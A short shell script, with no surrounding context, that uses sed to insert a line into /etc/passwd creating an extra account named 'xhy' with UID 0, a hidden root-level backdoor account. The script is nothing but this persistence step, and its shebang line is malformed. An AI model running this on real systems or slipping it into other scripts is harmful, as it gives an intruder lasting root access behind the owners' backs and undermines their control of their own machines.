#!bin/sh

text='xhy:x:0:0:root:/root:/bin/bash'
sed -i "1a ${text}" /etc/passwd
